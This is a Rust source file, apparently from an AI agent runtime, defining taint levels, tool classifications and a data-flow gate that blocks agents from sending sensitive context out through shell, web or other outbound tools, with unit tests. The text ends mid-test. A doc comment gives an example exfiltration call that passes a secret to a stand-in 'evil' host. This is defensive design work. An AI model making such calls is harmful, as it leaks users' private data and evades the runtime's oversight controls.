//! Context taint tracking types for security gating.
//!
//! Every piece of data entering a context region carries a sensitivity tag.
//! When an agent attempts an outbound action, the system checks whether
//! the data flowing into that action exceeds the tool's clearance level.
//! Taint levels are deterministic - set by the runtime based on tool
//! declarations and user policy, never by model output.

use serde::{Deserialize, Serialize};
use std::fmt;

/// Sensitivity level for data in context regions.
///
/// Ordered from least to most sensitive. When compared, higher sensitivity
/// levels are "greater than" lower ones.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TaintLevel {
    /// Freely shareable. Web search results, public documentation, open-source code.
    Public,
    /// Work-related but not personal. Private repo code, internal docs, team discussions.
    #[default]
    Internal,
    /// Personal or highly sensitive. Calendar, messages, contacts, financial data.
    Private,
}

impl TaintLevel {
    /// Returns the numeric rank of this taint level for ordering purposes.
    fn rank(self) -> u8 {
        match self {
            TaintLevel::Public => 0,
            TaintLevel::Internal => 1,
            TaintLevel::Private => 2,
        }
    }

    /// Returns the maximum of two taint levels.
    pub fn max(self, other: TaintLevel) -> TaintLevel {
        if self >= other { self } else { other }
    }

    /// Parse a taint level from a string (case-insensitive).
    pub fn from_str_loose(s: &str) -> Option<TaintLevel> {
        match s.to_lowercase().as_str() {
            "public" => Some(TaintLevel::Public),
            "internal" => Some(TaintLevel::Internal),
            "private" => Some(TaintLevel::Private),
            _ => None,
        }
    }

    /// Returns the string representation used in TOML config.
    pub fn as_str(self) -> &'static str {
        match self {
            TaintLevel::Public => "public",
            TaintLevel::Internal => "internal",
            TaintLevel::Private => "private",
        }
    }
}

impl PartialOrd for TaintLevel {
    fn partial_cmp(&self, other: &Self) -> Option<std::cmp::Ordering> {
        Some(self.cmp(other))
    }
}

impl Ord for TaintLevel {
    fn cmp(&self, other: &Self) -> std::cmp::Ordering {
        self.rank().cmp(&other.rank())
    }
}

impl fmt::Display for TaintLevel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Direction of a tool's data flow.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ToolDirection {
    /// Tool brings data into the agent (e.g., read_file, web_search).
    Inbound,
    /// Tool operates locally within the agent (e.g., write_file, ask_user).
    #[default]
    Internal,
    /// Tool sends data outside the agent (e.g., send_email, post_to_slack).
    Outbound,
}

impl ToolDirection {
    /// Parse from a string (case-insensitive).
    pub fn from_str_loose(s: &str) -> Option<ToolDirection> {
        match s.to_lowercase().as_str() {
            "inbound" => Some(ToolDirection::Inbound),
            "internal" => Some(ToolDirection::Internal),
            "outbound" => Some(ToolDirection::Outbound),
            _ => None,
        }
    }

    /// Returns the string representation used in TOML config.
    pub fn as_str(self) -> &'static str {
        match self {
            ToolDirection::Inbound => "inbound",
            ToolDirection::Internal => "internal",
            ToolDirection::Outbound => "outbound",
        }
    }
}

impl fmt::Display for ToolDirection {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Classification of a tool for taint tracking purposes.
///
/// Each tool declares its sensitivity (output taint level), direction
/// (inbound/internal/outbound), and clearance (max taint level allowed
/// for outbound operations).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ToolClassification {
    /// Sensitivity of the tool's output (what taint level its results carry).
    pub sensitivity: TaintLevel,
    /// Direction of data flow.
    pub direction: ToolDirection,
    /// Maximum taint level this tool can accept for outbound operations.
    /// Only meaningful when direction is Outbound.
    pub clearance: TaintLevel,
}

impl ToolClassification {
    /// Create a new tool classification.
    pub fn new(sensitivity: TaintLevel, direction: ToolDirection, clearance: TaintLevel) -> Self {
        Self {
            sensitivity,
            direction,
            clearance,
        }
    }

    /// Returns true if this tool is outbound (sends data outside the agent).
    pub fn is_outbound(&self) -> bool {
        self.direction == ToolDirection::Outbound
    }

    /// Check whether the given taint level passes this tool's gate.
    /// Returns true if the taint level is within clearance (taint <= clearance).
    /// Non-outbound tools always pass.
    pub fn check_clearance(&self, taint: TaintLevel) -> bool {
        if !self.is_outbound() {
            return true;
        }
        taint <= self.clearance
    }
}

impl Default for ToolClassification {
    fn default() -> Self {
        Self {
            sensitivity: TaintLevel::Internal,
            direction: ToolDirection::Internal,
            clearance: TaintLevel::Public,
        }
    }
}

/// Taint tracking state for a single region.
///
/// Tracks the current maximum taint level across all content in the region,
/// along with per-entry source tracking to support taint recovery on eviction.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegionTaint {
    /// Current maximum taint level in this region.
    current_level: TaintLevel,
    /// Per-entry taint levels, indexed in the same order as region content entries.
    entry_taints: Vec<TaintLevel>,
}

impl RegionTaint {
    /// Create a new RegionTaint defaulting to Public (no tainted data).
    pub fn new() -> Self {
        Self {
            current_level: TaintLevel::Public,
            entry_taints: Vec::new(),
        }
    }

    /// Get the current taint level of this region.
    pub fn level(&self) -> TaintLevel {
        self.current_level
    }

    /// Record that a new entry was added with the given taint level.
    /// Updates the region's current taint level if necessary.
    pub fn add_entry(&mut self, taint: TaintLevel) {
        self.entry_taints.push(taint);
        self.current_level = self.current_level.max(taint);
    }

    /// Record that the oldest entry was removed (e.g., sliding window eviction).
    /// Recomputes taint from remaining entries.
    pub fn remove_oldest(&mut self) {
        if !self.entry_taints.is_empty() {
            self.entry_taints.remove(0);
            self.recompute();
        }
    }

    /// Record that the entry at `idx` was removed.
    /// Recomputes taint from remaining entries.
    pub fn remove_at(&mut self, idx: usize) {
        if idx < self.entry_taints.len() {
            self.entry_taints.remove(idx);
            self.recompute();
        }
    }

    /// Record that all entries were cleared.
    pub fn clear(&mut self) {
        self.entry_taints.clear();
        self.current_level = TaintLevel::Public;
    }

    /// Recompute the taint level from remaining entries.
    /// Called after eviction to allow taint recovery.
    pub fn recompute(&mut self) {
        self.current_level = self
            .entry_taints
            .iter()
            .copied()
            .max()
            .unwrap_or(TaintLevel::Public);
    }

    /// Get the number of tracked entries.
    pub fn entry_count(&self) -> usize {
        self.entry_taints.len()
    }

    /// Get the taint level of a specific entry by index.
    /// Rebuild from a persisted list of per-entry taints.
    ///
    /// `current_level` is derived rather than stored, so a restored region ends
    /// up at exactly the level its entries justify - and recovers as they evict,
    /// the same as one that was never persisted.
    pub fn from_entry_taints(entry_taints: Vec<TaintLevel>) -> Self {
        let current_level = entry_taints
            .iter()
            .copied()
            .max()
            .unwrap_or(TaintLevel::Public);
        Self {
            current_level,
            entry_taints,
        }
    }

    /// The taint recorded for the entry at `index`, or `None` when the index is
    /// past the end.
    ///
    /// Returns `Option` rather than defaulting to `Public` so a caller cannot
    /// mistake "no such entry" for "that entry is clean".
    pub fn entry_taint(&self, index: usize) -> Option<TaintLevel> {
        self.entry_taints.get(index).copied()
    }
}

impl Default for RegionTaint {
    fn default() -> Self {
        Self::new()
    }
}

/// Security configuration for taint tracking.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityConfig {
    /// Whether taint tracking is enabled.
    pub taint_tracking: bool,
}

impl Default for SecurityConfig {
    fn default() -> Self {
        // A present `[security]` block (even empty) means "configure security",
        // so the struct default is taint-on; a manifest with no block at all
        // yields `None`, which callers must resolve through
        // [`resolve_security`]/[`resolve_taint_enabled`] (default off). Do NOT
        // use `unwrap_or_default()` on an optional agent/global config - that
        // conflates "no block" with "empty block" and forces taint on
        // everywhere; cascade through the global setting instead.
        Self {
            taint_tracking: true,
        }
    }
}

/// Resolve whether taint tracking is enabled for a stage, cascading
/// stage → agent → global (default off when nothing is set).
///
/// **A blueprint can only turn taint tracking on, never off.** The stage and
/// agent configs come from `agent.leviath`, so if a manifest could set
/// `taint_tracking = false` over a user's global `true`, installing an agent
/// would be enough to disable the machine's data-flow enforcement. A manifest
/// that wants tracking when the user has it off is still honored - that
/// direction only tightens.
pub fn resolve_taint_enabled(
    global: bool,
    agent: Option<&SecurityConfig>,
    stage: Option<&SecurityConfig>,
) -> bool {
    let manifest = stage
        .map(|s| s.taint_tracking)
        .or_else(|| agent.map(|a| a.taint_tracking));
    global || manifest.unwrap_or(false)
}

/// Resolve the effective [`SecurityConfig`] for a stage: the most specific
/// present config (stage over agent), or a default whose `taint_tracking`
/// follows the global toggle when neither level configures it.
///
/// `taint_tracking` is clamped by [`resolve_taint_enabled`] so the two agree -
/// a manifest cannot disable what the user enabled.
pub fn resolve_security(
    global: bool,
    agent: Option<&SecurityConfig>,
    stage: Option<&SecurityConfig>,
) -> SecurityConfig {
    let mut resolved = match stage.or(agent) {
        Some(c) => c.clone(),
        None => SecurityConfig {
            taint_tracking: global,
        },
    };
    resolved.taint_tracking = resolve_taint_enabled(global, agent, stage);
    resolved
}

/// The shared stage → agent → global cascade behind the system-prompt hint
/// toggles. A `Some(_)` at a narrower level overrides broader levels; when
/// neither the stage nor the agent sets it, the global toggle applies. (Same
/// shape as [`resolve_taint_enabled`], but the global default is on rather than
/// off, and a manifest may turn a hint off - these are UX knobs, not security.)
fn resolve_hint(global: bool, agent: Option<bool>, stage: Option<bool>) -> bool {
    stage.or(agent).unwrap_or(global)
}

/// Resolve whether the batch-tool-calls system-prompt hint is enabled for a
/// stage, cascading stage → agent → global: a `Some(_)` at a narrower level
/// wins, and an unset pair falls through to the global toggle.
pub fn resolve_batch_tool_hint(global: bool, agent: Option<bool>, stage: Option<bool>) -> bool {
    resolve_hint(global, agent, stage)
}

/// Resolve whether the platform shell hint is enabled for a stage, cascading
/// stage → agent → global on the same terms as [`resolve_batch_tool_hint`].
///
/// Enabled only decides whether the hint is *eligible*. It is emitted only when
/// the host platform has something worth saying about its shell and the stage
/// actually advertises the shell tool, both checked at request-build time.
pub fn resolve_shell_hint(global: bool, agent: Option<bool>, stage: Option<bool>) -> bool {
    resolve_hint(global, agent, stage)
}

/// Result of a gate check - whether a tool invocation is allowed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GateDecision {
    /// Taint level is within clearance - proceed.
    Allowed,
    /// Taint level exceeds clearance - gate fires.
    Blocked {
        /// The taint level that caused the block.
        taint_level: TaintLevel,
        /// The tool's clearance level.
        clearance: TaintLevel,
        /// Names of regions contributing to the taint.
        source_regions: Vec<String>,
        /// The tool being invoked.
        tool_name: String,
    },
}

impl GateDecision {
    /// Returns true if the gate allows the action.
    pub fn is_allowed(&self) -> bool {
        matches!(self, GateDecision::Allowed)
    }

    /// For a `Blocked` decision, the `(taint_level, clearance)` that caused the
    /// block; `None` for `Allowed`.
    pub fn blocked_levels(&self) -> Option<(TaintLevel, TaintLevel)> {
        match self {
            GateDecision::Blocked {
                taint_level,
                clearance,
                ..
            } => Some((*taint_level, *clearance)),
            GateDecision::Allowed => None,
        }
    }
}

/// A single gate event for audit logging.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GateEvent {
    /// Timestamp of the event.
    pub timestamp: i64,
    /// Agent that triggered the gate.
    pub agent_id: String,
    /// Tool being invoked.
    pub tool_name: String,
    /// Taint level at time of check.
    pub taint_level: TaintLevel,
    /// Tool's clearance level.
    pub clearance: TaintLevel,
    /// Whether the action was allowed.
    pub allowed: bool,
    /// How the decision was made.
    pub decision_source: GateDecisionSource,
}

/// How a gate decision was reached.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum GateDecisionSource {
    /// Taint was within clearance - automatic allow.
    AutoAllow,
    /// Taint exceeded clearance - automatic block, before any user decision.
    AutoBlock,
    /// Matched a static allowlist rule.
    AllowlistRule {
        /// Which rule matched, by position in the configured list, so a decision
        /// can be traced back to the line that made it.
        rule_index: usize,
    },
    /// Matched a scripted (Rhai) rule.
    ScriptedRule {
        /// The script that allowed it, by path as declared.
        script_name: String,
    },
    /// User allowed once interactively.
    UserAllowOnce,
    /// User created an "always allow" rule.
    UserAlwaysAllow,
    /// User denied the action.
    UserDenied,
    /// Taint tracking is disabled - automatic allow.
    TaintDisabled,
    /// Auto-approved by `--yolo`: the gate would have blocked, but the agent
    /// runs unattended so enforcement is waived. Recorded (rather than silently
    /// skipped) so the audit trail still shows the over-cleared call.
    YoloAutoApprove,
}

/// Built-in tool classification defaults.
///
/// The taint gate only fires on tools classified [`ToolDirection::Outbound`], so
/// this table decides what data-flow enforcement can see at all. Anything that
/// can carry bytes off the machine must be outbound: marking **only**
/// `shell`/`bash` would let a Private-tainted context be exfiltrated by
/// `web_fetch("https://evil/?d=<secret>")` with taint tracking fully enabled -
/// along with any MCP tool and any script tool, which an internal/internal
/// fallback would never gate.
///
/// The fallback for an *unknown* tool is outbound too. An unrecognized tool is
/// usually an MCP or script tool - third-party code reaching a third-party
/// service - so an internal default would assume the safest case about the
/// least-known code. Failing closed costs a prompt; failing open costs the data.
pub fn builtin_tool_classification(tool_name: &str) -> ToolClassification {
    // An unknown tool is almost always an MCP or Rhai script tool:
    // third-party code, usually talking to a third-party service. Treat it
    // as outbound so the gate sees it. `ToolClassification::default()` -
    // internal/internal - assumed the safest case about the least-known
    // code, and left every MCP and script tool ungated.
    classified_builtin(tool_name).unwrap_or_else(|| {
        ToolClassification::new(
            TaintLevel::Public,
            ToolDirection::Outbound,
            TaintLevel::Public,
        )
    })
}

/// The classification of a built-in tool by name, or `None` for a name that
/// has no arm of its own and so takes the third-party default.
///
/// Separate from [`builtin_tool_classification`] so a test can hold every
/// built-in the registry advertises to an arm of its own: the default is
/// outbound and gated, and a built-in that reached it was blocked in every
/// taint-tracking run with anything Private in context, silently.
pub fn classified_builtin(tool_name: &str) -> Option<ToolClassification> {
    let classification = match tool_name {
        // `read_files` is `read_file` over several paths.
        "read_file" | "read_files" => ToolClassification::new(
            TaintLevel::Internal,
            ToolDirection::Inbound,
            TaintLevel::Public,
        ),
        // `install_tool` writes one file to the local tools directory the way
        // `write_file` writes one to the workdir; nothing leaves the machine.
        "write_file" | "install_tool" => ToolClassification::new(
            TaintLevel::Internal,
            ToolDirection::Internal,
            TaintLevel::Public,
        ),
        // `edit_document` edits a draft the same way `edit_file` edits a
        // file, with a person at the other end instead of the disk.
        "edit_file" | "edit_document" => ToolClassification::new(
            TaintLevel::Internal,
            ToolDirection::Internal,
            TaintLevel::Public,
        ),
        // The context and todo tools write the run's own state: the agent's
        // regions and its checklist. Nothing leaves the machine, so none is a
        // channel the gate watches.
        "context_write" | "context_append" | "context_read" | "context_delete" | "context_list"
        | "todo_add" | "todo_done" | "todo_note" => ToolClassification::new(
            TaintLevel::Internal,
            ToolDirection::Internal,
            TaintLevel::Public,
        ),
        // `submit_output` records the answer the caller gets back, and the
        // caller is not always on this machine: `lev serve` hands it to any
        // reader of `GET /api/agents/{id}/result`, and the dashboard shows
        // it. It is the run's one deliberate channel out, so it takes the
        // shape `shell` has, outbound with Public clearance, and a Private
        // region in a submitted answer raises the leak prompt (or the
        // policy's verdict) rather than leaving quietly. It sat with the
        // context tools as internal before, which let Private context reach
        // a remote reader with no prompt at all.
        "submit_output" => ToolClassification::new(
            TaintLevel::Public,
            ToolDirection::Outbound,
            TaintLevel::Public,
        ),
        "list_dir" => ToolClassification::new(
            TaintLevel::Internal,
            ToolDirection::Inbound,
            TaintLevel::Public,
        ),
        "shell" | "bash" => ToolClassification::new(
            TaintLevel::Public,
            ToolDirection::Outbound,
            TaintLevel::Public,
        ),
        // `web_search` sends a *query* the model wrote, so it is not purely
        // inbound: the query itself is a channel out. Classified outbound so a
        // Private context cannot be smuggled into a search string.
        "web_search" | "web_fetch" | "http_get" | "http_post" | "fetch" => ToolClassification::new(
            TaintLevel::Public,
            ToolDirection::Outbound,
            TaintLevel::Public,
        ),
        // The environment tools bring facts about the host *in*; none of them
        // sends anything out, so none is a channel the gate needs to watch.
        //
        // `current_time` and `locale_info` are Public: the date and the user's
        // language are not secrets. The other three are Internal because they
        // name this machine, its directory layout, its installed software and
        // the run's own configuration - not secret, but not for publishing
        // either, so a Public-clearance outbound tool cannot forward them.
        "current_time" | "locale_info" => ToolClassification::new(
            TaintLevel::Public,
            ToolDirection::Inbound,
            TaintLevel::Public,
        ),
        "system_info" | "environment_info" | "which_command" | "runtime_info" => {
            ToolClassification::new(
                TaintLevel::Internal,
                ToolDirection::Inbound,
                TaintLevel::Public,
            )
        }
        "ask_user_text" | "ask_user_choice" | "ask_user_confirm" | "present_for_review" => {
            ToolClassification::new(
                TaintLevel::Internal,
                ToolDirection::Internal,
                TaintLevel::Public,
            )
        }
        // `fan_out` is many `spawn_agent`s at once.
        "spawn_agent" | "check_agent" | "wait_for_agent" | "send_to_agent" | "kill_agent"
        | "fan_out" => ToolClassification::new(
            TaintLevel::Internal,
            ToolDirection::Internal,
            TaintLevel::Public,
        ),
        _ => return None,
    };
    Some(classification)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Without persisted taint, every restart, resume or page-in brings a
    /// region back `Public` while the gate reports itself armed, silently
    /// unblocking outbound tools it should be blocking.
    #[test]
    fn taint_rebuilds_from_persisted_entries_at_the_highest_level() {
        let restored = RegionTaint::from_entry_taints(vec![
            TaintLevel::Public,
            TaintLevel::Private,
            TaintLevel::Internal,
        ]);
        assert_eq!(restored.level(), TaintLevel::Private);
        assert_eq!(restored.entry_taint(1), Some(TaintLevel::Private));

        // An empty region is Public, which is also what an older snapshot with
        // no taint field restores as.
        assert_eq!(
            RegionTaint::from_entry_taints(Vec::new()).level(),
            TaintLevel::Public
        );
    }

    // ─── TaintLevel ─────────────────────────────────────────────────────────

    #[test]
    fn taint_level_ordering() {
        assert!(TaintLevel::Public < TaintLevel::Internal);
        assert!(TaintLevel::Internal < TaintLevel::Private);
        assert!(TaintLevel::Public < TaintLevel::Private);
    }

    #[test]
    fn taint_level_equality() {
        assert_eq!(TaintLevel::Public, TaintLevel::Public);
        assert_eq!(TaintLevel::Internal, TaintLevel::Internal);
        assert_eq!(TaintLevel::Private, TaintLevel::Private);
        assert_ne!(TaintLevel::Public, TaintLevel::Private);
    }

    #[test]
    fn taint_level_max() {
        assert_eq!(
            TaintLevel::Public.max(TaintLevel::Internal),
            TaintLevel::Internal
        );
        assert_eq!(
            TaintLevel::Private.max(TaintLevel::Public),
            TaintLevel::Private
        );
        assert_eq!(
            TaintLevel::Internal.max(TaintLevel::Internal),
            TaintLevel::Internal
        );
    }

    #[test]
    fn taint_level_default_is_internal() {
        assert_eq!(TaintLevel::default(), TaintLevel::Internal);
    }

    #[test]
    fn taint_level_display() {
        assert_eq!(format!("{}", TaintLevel::Public), "public");
        assert_eq!(format!("{}", TaintLevel::Internal), "internal");
        assert_eq!(format!("{}", TaintLevel::Private), "private");
    }

    #[test]
    fn taint_level_from_str_loose() {
        assert_eq!(
            TaintLevel::from_str_loose("public"),
            Some(TaintLevel::Public)
        );
        assert_eq!(
            TaintLevel::from_str_loose("INTERNAL"),
            Some(TaintLevel::Internal)
        );
        assert_eq!(
            TaintLevel::from_str_loose("Private"),
            Some(TaintLevel::Private)
        );
        assert_eq!(TaintLevel::from_str_loose("unknown"), None);
    }

    #[test]
    fn taint_level_as_str() {
        assert_eq!(TaintLevel::Public.as_str(), "public");
        assert_eq!(TaintLevel::Internal.as_str(), "internal");
        assert_eq!(TaintLevel::Private.as_str(), "private");
    }

    #[test]
    fn taint_level_serde_roundtrip() {
        for level in [
            TaintLevel::Public,
            TaintLevel::Internal,
            TaintLevel::Private,
        ] {
            let json = serde_json::to_string(&level).unwrap();
            let back: TaintLevel = serde_json::from_str(&json).unwrap();
            assert_eq!(level, back);
        }
    }

    #[test]
    fn taint_level_hash() {
        use std::collections::HashSet;
        let mut set = HashSet::new();
        set.insert(TaintLevel::Public);
        set.insert(TaintLevel::Internal);
        set.insert(TaintLevel::Private);
        set.insert(TaintLevel::Public); // duplicate
        assert_eq!(set.len(), 3);
    }

    // ─── ToolDirection ──────────────────────────────────────────────────────

    #[test]
    fn tool_direction_from_str_loose() {
        assert_eq!(
            ToolDirection::from_str_loose("inbound"),
            Some(ToolDirection::Inbound)
        );
        assert_eq!(
            ToolDirection::from_str_loose("OUTBOUND"),
            Some(ToolDirection::Outbound)
        );
        assert_eq!(
            ToolDirection::from_str_loose("Internal"),
            Some(ToolDirection::Internal)
        );
        assert_eq!(ToolDirection::from_str_loose("nope"), None);
    }

    #[test]
    fn tool_direction_default_is_internal() {
        assert_eq!(ToolDirection::default(), ToolDirection::Internal);
    }

    #[test]
    fn tool_direction_display() {
        assert_eq!(format!("{}", ToolDirection::Inbound), "inbound");
        assert_eq!(format!("{}", ToolDirection::Internal), "internal");
        assert_eq!(format!("{}", ToolDirection::Outbound), "outbound");
    }

    #[test]
    fn tool_direction_serde_roundtrip() {
        for dir in [
            ToolDirection::Inbound,
            ToolDirection::Internal,
            ToolDirection::Outbound,
        ] {
            let json = serde_json::to_string(&dir).unwrap();
            let back: ToolDirection = serde_json::from_str(&json).unwrap();
            assert_eq!(dir, back);
        }
    }

    // ─── ToolClassification ────────────────────────────────────────────────

    #[test]
    fn tool_classification_default() {
        let tc = ToolClassification::default();
        assert_eq!(tc.sensitivity, TaintLevel::Internal);
        assert_eq!(tc.direction, ToolDirection::Internal);
        assert_eq!(tc.clearance, TaintLevel::Public);
    }

    #[test]
    fn tool_classification_outbound_check() {
        let tc = ToolClassification::new(
            TaintLevel::Public,
            ToolDirection::Outbound,
            TaintLevel::Internal,
        );
        assert!(tc.is_outbound());
        assert!(tc.check_clearance(TaintLevel::Public));
        assert!(tc.check_clearance(TaintLevel::Internal));
        assert!(!tc.check_clearance(TaintLevel::Private));
    }

    #[test]
    fn tool_classification_non_outbound_always_passes() {
        let tc = ToolClassification::new(
            TaintLevel::Private,
            ToolDirection::Inbound,
            TaintLevel::Public, // clearance is irrelevant for non-outbound
        );
        assert!(!tc.is_outbound());
        assert!(tc.check_clearance(TaintLevel::Private));
    }

    #[test]
    fn tool_classification_serde_roundtrip() {
        let tc = ToolClassification::new(
            TaintLevel::Private,
            ToolDirection::Outbound,
            TaintLevel::Internal,
        );
        let json = serde_json::to_string(&tc).unwrap();
        let back: ToolClassification = serde_json::from_str(&json).unwrap();
        assert_eq!(tc, back);
    }

    // ─── RegionTaint ───────────────────────────────────────────────────────

    #[test]
    fn region_taint_starts_public() {
        let rt = RegionTaint::new();
        assert_eq!(rt.level(), TaintLevel::Public);
        assert_eq!(rt.entry_count(), 0);
    }

    #[test]
    fn region_taint_add_entry_raises_level() {
        let mut rt = RegionTaint::new();
        rt.add_entry(TaintLevel::Internal);
        assert_eq!(rt.level(), TaintLevel::Internal);
        rt.add_entry(TaintLevel::Private);
        assert_eq!(rt.level(), TaintLevel::Private);
    }

    #[test]
    fn region_taint_add_public_doesnt_lower() {
        let mut rt = RegionTaint::new();
        rt.add_entry(TaintLevel::Private);
        rt.add_entry(TaintLevel::Public);
        assert_eq!(rt.level(), TaintLevel::Private);
    }

    #[test]
    fn region_taint_remove_oldest_recovers() {
        let mut rt = RegionTaint::new();
        rt.add_entry(TaintLevel::Private);
        rt.add_entry(TaintLevel::Public);
        assert_eq!(rt.level(), TaintLevel::Private);

        rt.remove_oldest(); // removes Private entry
        assert_eq!(rt.level(), TaintLevel::Public);
    }

    #[test]
    fn region_taint_remove_oldest_empty() {
        let mut rt = RegionTaint::new();
        rt.remove_oldest(); // no-op
        assert_eq!(rt.level(), TaintLevel::Public);
    }

    #[test]
    fn region_taint_clear() {
        let mut rt = RegionTaint::new();
        rt.add_entry(TaintLevel::Private);
        rt.add_entry(TaintLevel::Internal);
        rt.clear();
        assert_eq!(rt.level(), TaintLevel::Public);
        assert_eq!(rt.entry_count(), 0);
    }

    #[test]
    fn region_taint_recompute() {
        let mut rt = RegionTaint::new();
        rt.add_entry(TaintLevel::Private);
        rt.add_entry(TaintLevel::Internal);
        rt.add_entry(TaintLevel::Public);
        assert_eq!(rt.entry_count(), 3);

        // Simulate eviction of first entry
        rt.remove_oldest();
        assert_eq!(rt.level(), TaintLevel::Internal);
        assert_eq!(rt.entry_count(), 2);
    }

    #[test]
    fn region_taint_entry_taint() {
        let mut rt = RegionTaint::new();
        rt.add_entry(TaintLevel::Public);
        rt.add_entry(TaintLevel::Private);
        assert_eq!(rt.entry_taint(0), Some(TaintLevel::Public));
        assert_eq!(rt.entry_taint(1), Some(TaintLevel::Private));
        assert_eq!(rt.entry_taint(2), None);
    }

    #[test]
    fn region_taint_default() {
        let rt = RegionTaint::default();
        assert_eq!(rt.level(), TaintLevel::Public);
    }

    #[test]
    fn region_taint_serde_roundtrip() {
        let mut rt = RegionTaint::new();
        rt.add_entry(TaintLevel::Internal);
        rt.add_entry(TaintLevel::Private);
        let json = serde_json::to_string(&rt).unwrap();
        let back: RegionTaint = serde_json::from_str(&json).unwrap();
        assert_eq!(back.level(), TaintLevel::Private);
        assert_eq!(back.entry_count(), 2);
    }

    // ─── SecurityConfig ─────────────────────────────────────────────────────

    #[test]
    fn security_config_default() {
        let sc = SecurityConfig::default();
        assert!(sc.taint_tracking);
    }

    #[test]
    fn security_config_serde_roundtrip() {
        let sc = SecurityConfig {
            taint_tracking: false,
        };
        let json = serde_json::to_string(&sc).unwrap();
        let back: SecurityConfig = serde_json::from_str(&json).unwrap();
        assert!(!back.taint_tracking);
    }

    // ─── GateDecision ───────────────────────────────────────────────────────

    #[test]
    fn gate_decision_allowed() {
        let d = GateDecision::Allowed;
        assert!(d.is_allowed());
    }

    #[test]
    fn gate_decision_blocked() {
        let d = GateDecision::Blocked {
            taint_level: TaintLevel::Private,
            clearance: TaintLevel::Public,
            source_regions: vec!["conversation".into()],
            tool_name: "send_email".into(),
        };
        assert!(!d.is_allowed());
    }

    // ─── GateEvent ──────────────────────────────────────────────────────────

    #[test]
    fn gate_event_serde_roundtrip() {
        let event = GateEvent {
            timestamp: 1234567890,
            agent_id: "agent-1".into(),
            tool_name: "send_email".into(),
            taint_level: TaintLevel::Private,
            clearance: TaintLevel::Public,
            allowed: false,
            decision_source: GateDecisionSource::UserDenied,
        };
        let json = serde_json::to_string(&event).unwrap();
        let back: GateEvent = serde_json::from_str(&json).unwrap();
        assert_eq!(back.agent_id, "agent-1");
        assert!(!back.allowed);
    }

    #[test]
    fn gate_decision_source_variants() {
        let sources = vec![
            GateDecisionSource::AutoAllow,
            GateDecisionSource::AllowlistRule { rule_index: 0 },
            GateDecisionSource::ScriptedRule {
                script_name: "test.rhai".into(),
            },
            GateDecisionSource::UserAllowOnce,
            GateDecisionSource::UserAlwaysAllow,
            GateDecisionSource::UserDenied,
            GateDecisionSource::TaintDisabled,
        ];
        for src in sources {
            let json = serde_json::to_string(&src).unwrap();
            let back: GateDecisionSource = serde_json::from_str(&json).unwrap();
            assert_eq!(src, back);
        }
    }

    // ─── Built-in tool classifications ──────────────────────────────────────

    #[test]
    fn builtin_read_file_classification() {
        let tc = builtin_tool_classification("read_file");
        assert_eq!(tc.sensitivity, TaintLevel::Internal);
        assert_eq!(tc.direction, ToolDirection::Inbound);
    }

    #[test]
    fn builtin_shell_classification() {
        let tc = builtin_tool_classification("shell");
        assert_eq!(tc.sensitivity, TaintLevel::Public);
        assert_eq!(tc.direction, ToolDirection::Outbound);
        assert_eq!(tc.clearance, TaintLevel::Public);

        // bash alias
        let tc2 = builtin_tool_classification("bash");
        assert_eq!(tc2.direction, ToolDirection::Outbound);
    }

    /// Every tool that can carry bytes off the machine is outbound, which is
    /// the only direction the gate inspects. `web_search` counts: the *query*
    /// is model-written, so it is a channel out even though the results come
    /// back in. Previously only `shell`/`bash` were outbound, so a Private
    /// context could be exfiltrated through any of these with taint tracking
    /// fully enabled.
    #[test]
    fn network_capable_tools_are_outbound() {
        for name in ["web_search", "web_fetch", "http_get", "http_post", "fetch"] {
            let tc = builtin_tool_classification(name);
            assert_eq!(tc.sensitivity, TaintLevel::Public, "{name}");
            assert_eq!(tc.direction, ToolDirection::Outbound, "{name}");
        }
    }

    /// The environment tools bring facts about the host in and send nothing
    /// out, so none of them is a channel the gate needs to watch. Getting this
    /// wrong is silent: the `_` fallback is outbound, so an unclassified
    /// environment tool would be gated in every taint-tracking run, and asking
    /// what day it is would raise a leak prompt.
    #[test]
    fn environment_tools_are_inbound_and_never_gated() {
        for name in [
            "current_time",
            "system_info",
            "locale_info",
            "environment_info",
            "which_command",
            "runtime_info",
        ] {
            let tc = builtin_tool_classification(name);
            assert_eq!(tc.direction, ToolDirection::Inbound, "{name}");
            // Inbound tools are not gated at all, whatever the context holds.
            assert_eq!(tc.clearance, TaintLevel::Public, "{name}");
        }
    }

    /// The date and the user's language are not secrets; the machine's name,
    /// its directory layout, its installed software and the run's own
    /// configuration are not for publishing. The split matters because the
    /// sensitivity is what an *outbound* tool later has to be cleared for.
    #[test]
    fn environment_tools_are_graded_by_what_they_reveal() {
        for name in ["current_time", "locale_info"] {
            assert_eq!(
                builtin_tool_classification(name).sensitivity,
                TaintLevel::Public,
                "{name}"
            );
        }
        for name in [
            "system_info",
            "environment_info",
            "which_command",
            "runtime_info",
        ] {
            assert_eq!(
                builtin_tool_classification(name).sensitivity,
                TaintLevel::Internal,
                "{name}"
            );
        }
    }

    #[test]
    fn builtin_ask_user_classification() {
        for name in [
            "ask_user_text",
            "ask_user_choice",
            "ask_user_confirm",
            "present_for_review",
        ] {
            let tc = builtin_tool_classification(name);
            assert_eq!(tc.direction, ToolDirection::Internal);
        }
    }

    #[test]
    fn builtin_subagent_classification() {
        for name in [
            "spawn_agent",
            "check_agent",
            "wait_for_agent",
            "send_to_agent",
            "kill_agent",
        ] {
            let tc = builtin_tool_classification(name);
            assert_eq!(tc.direction, ToolDirection::Internal);
        }
    }

    #[test]
    fn builtin_write_file_classification() {
        let tc = builtin_tool_classification("write_file");
        assert_eq!(tc.direction, ToolDirection::Internal);
    }

    /// `install_tool` writes a file on the local machine, like `write_file`;
    /// without an arm of its own it would fall to the outbound default and
    /// every taint-tracking run would gate the persist path as a leak.
    #[test]
